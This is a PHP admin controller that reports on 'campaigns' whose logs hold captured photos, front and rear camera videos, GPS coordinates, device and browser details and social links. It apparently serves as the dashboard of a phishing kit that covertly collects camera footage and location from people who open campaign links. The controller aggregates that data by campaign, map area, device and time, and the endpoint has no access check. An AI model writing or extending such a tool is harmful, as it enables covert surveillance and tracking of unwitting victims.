<?php
require_once '../db.php';

class AdminController {
    private $db;

    public function __construct() {
        $this->db = Database::getInstance();
    }

    public function handleRequest() {
        switch ($_SERVER['REQUEST_METHOD']) {
            case 'GET':
                $action = isset($_GET['action']) ? $_GET['action'] : 'dashboard';
                return $this->handleGetRequest($action);
            default:
                http_response_code(405);
                return ['error' => 'Method not allowed'];
        }
    }

    private function handleGetRequest($action) {
        switch ($action) {
            case 'dashboard':
                return $this->getDashboardStats();
            case 'campaign_details':
                return $this->getCampaignDetails();
            case 'geographic_data':
                return $this->getGeographicData();
            case 'device_stats':
                return $this->getDeviceStats();
            case 'activity_timeline':
                return $this->getActivityTimeline();
            default:
                http_response_code(400);
                return ['error' => 'Invalid action'];
        }
    }

    private function getDashboardStats() {
        try {
            // Get total campaigns
            $campaignsSql = "SELECT 
                                COUNT(*) as total_campaigns,
                                COUNT(CASE WHEN created_at >= DATE_SUB(NOW(), INTERVAL 24 HOUR) THEN 1 END) as new_campaigns,
                                SUM(current_views) as total_views
                            FROM campaigns";
            $campaignsResult = $this->db->query($campaignsSql)->fetch();

            // Get media stats
            $mediaSql = "SELECT 
                            COUNT(CASE WHEN media_type = 'photo' THEN 1 END) as total_photos,
                            COUNT(CASE WHEN media_type IN ('video_front', 'video_rear') THEN 1 END) as total_videos
                        FROM media_logs";
            $mediaResult = $this->db->query($mediaSql)->fetch();

            // Get platform distribution
            $platformSql = "SELECT 
                            platform,
                            COUNT(*) as count,
                            (COUNT(*) * 100.0 / (SELECT COUNT(*) FROM social_links)) as percentage
                          FROM social_links 
                          GROUP BY platform";
            $platformResult = $this->db->query($platformSql)->fetchAll();

            // Get recent activity
            $activitySql = "SELECT 'media' as type, captured_at as timestamp, media_type as details 
                           FROM media_logs
                           UNION ALL
                           SELECT 'gps' as type, captured_at as timestamp, 
                                  CONCAT(latitude, ',', longitude) as details 
                           FROM gps_logs
                           UNION ALL
                           SELECT 'social' as type, captured_at as timestamp, 
                                  CONCAT(platform, ': ', video_url) as details 
                           FROM social_links
                           ORDER BY timestamp DESC
                           LIMIT 10";
            $activityResult = $this->db->query($activitySql)->fetchAll();

            return [
                'success' => true,
                'data' => [
                    'campaigns' => $campaignsResult,
                    'media' => $mediaResult,
                    'platform_distribution' => $platformResult,
                    'recent_activity' => $activityResult
                ]
            ];

        } catch (Exception $e) {
            error_log("Dashboard Stats Error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Failed to retrieve dashboard statistics'];
        }
    }

    private function getCampaignDetails() {
        try {
            $campaignId = isset($_GET['campaign_id']) ? $_GET['campaign_id'] : null;

            if (!$campaignId) {
                http_response_code(400);
                return ['error' => 'Campaign ID is required'];
            }

            // Get campaign details with media counts
            $sql = "SELECT 
                        c.*,
                        COUNT(DISTINCT m.id) as total_media,
                        COUNT(DISTINCT g.id) as total_gps_logs,
                        COUNT(DISTINCT s.id) as total_social_links,
                        MAX(g.captured_at) as last_activity
                    FROM campaigns c
                    LEFT JOIN media_logs m ON c.id = m.campaign_id
                    LEFT JOIN gps_logs g ON c.id = g.campaign_id
                    LEFT JOIN social_links s ON c.id = s.campaign_id
                    WHERE c.id = :campaign_id
                    GROUP BY c.id";

            $result = $this->db->query($sql, [':campaign_id' => $campaignId]);
            $campaign = $result->fetch();

            if (!$campaign) {
                http_response_code(404);
                return ['error' => 'Campaign not found'];
            }

            // Get media breakdown
            $mediaSql = "SELECT media_type, COUNT(*) as count 
                        FROM media_logs 
                        WHERE campaign_id = :campaign_id 
                        GROUP BY media_type";
            $mediaBreakdown = $this->db->query($mediaSql, [':campaign_id' => $campaignId])->fetchAll();

            // Get platform breakdown
            $platformSql = "SELECT platform, COUNT(*) as count 
                          FROM social_links 
                          WHERE campaign_id = :campaign_id 
                          GROUP BY platform";
            $platformBreakdown = $this->db->query($platformSql, [':campaign_id' => $campaignId])->fetchAll();

            return [
                'success' => true,
                'data' => [
                    'campaign' => $campaign,
                    'media_breakdown' => $mediaBreakdown,
                    'platform_breakdown' => $platformBreakdown
                ]
            ];

        } catch (Exception $e) {
            error_log("Campaign Details Error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Failed to retrieve campaign details'];
        }
    }

    private function getGeographicData() {
        try {
            $timeframe = isset($_GET['timeframe']) ? $_GET['timeframe'] : '24h';
            
            $timeCondition = match($timeframe) {
                '24h' => 'DATE_SUB(NOW(), INTERVAL 24 HOUR)',
                '7d' => 'DATE_SUB(NOW(), INTERVAL 7 DAY)',
                '30d' => 'DATE_SUB(NOW(), INTERVAL 30 DAY)',
                'all' => 'created_at',
                default => 'DATE_SUB(NOW(), INTERVAL 24 HOUR)'
            };

            $sql = "SELECT 
                        latitude, 
                        longitude, 
                        COUNT(*) as point_count,
                        campaign_id,
                        captured_at
                    FROM gps_logs
                    WHERE captured_at >= {$timeCondition}
                    GROUP BY ROUND(latitude, 2), ROUND(longitude, 2)
                    ORDER BY captured_at DESC";

            $result = $this->db->query($sql)->fetchAll();

            return [
                'success' => true,
                'data' => $result
            ];

        } catch (Exception $e) {
            error_log("Geographic Data Error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Failed to retrieve geographic data'];
        }
    }

    private function getDeviceStats() {
        try {
            $sql = "SELECT 
                        device_details,
                        browser_details,
                        COUNT(*) as count,
                        (COUNT(*) * 100.0 / (SELECT COUNT(*) FROM device_logs)) as percentage
                    FROM device_logs
                    GROUP BY device_details, browser_details
                    ORDER BY count DESC";

            $result = $this->db->query($sql)->fetchAll();

            return [
                'success' => true,
                'data' => $result
            ];

        } catch (Exception $e) {
            error_log("Device Stats Error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Failed to retrieve device statistics'];
        }
    }

    private function getActivityTimeline() {
        try {
            $period = isset($_GET['period']) ? $_GET['period'] : 'daily';
            
            $groupBy = match($period) {
                'hourly' => 'DATE_FORMAT(captured_at, "%Y-%m-%d %H:00:00")',
                'daily' => 'DATE(captured_at)',
                'weekly' => 'DATE(DATE_SUB(captured_at, INTERVAL WEEKDAY(captured_at) DAY))',
                'monthly' => 'DATE_FORMAT(captured_at, "%Y-%m-01")',
                default => 'DATE(captured_at)'
            };

            $sql = "SELECT 
                        {$groupBy} as time_period,
                        COUNT(DISTINCT CASE WHEN type = 'media' THEN id END) as media_count,
                        COUNT(DISTINCT CASE WHEN type = 'gps' THEN id END) as gps_count,
                        COUNT(DISTINCT CASE WHEN type = 'social' THEN id END) as social_count
                    FROM (
                        SELECT id, 'media' as type, captured_at FROM media_logs
                        UNION ALL
                        SELECT id, 'gps' as type, captured_at FROM gps_logs
                        UNION ALL
                        SELECT id, 'social' as type, captured_at FROM social_links
                    ) combined_logs
                    GROUP BY time_period
                    ORDER BY time_period DESC
                    LIMIT 30";

            $result = $this->db->query($sql)->fetchAll();

            return [
                'success' => true,
                'data' => $result
            ];

        } catch (Exception $e) {
            error_log("Activity Timeline Error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Failed to retrieve activity timeline'];
        }
    }
}

// Handle the request
$controller = new AdminController();
$response = $controller->handleRequest();
echo json_encode($response);
?>
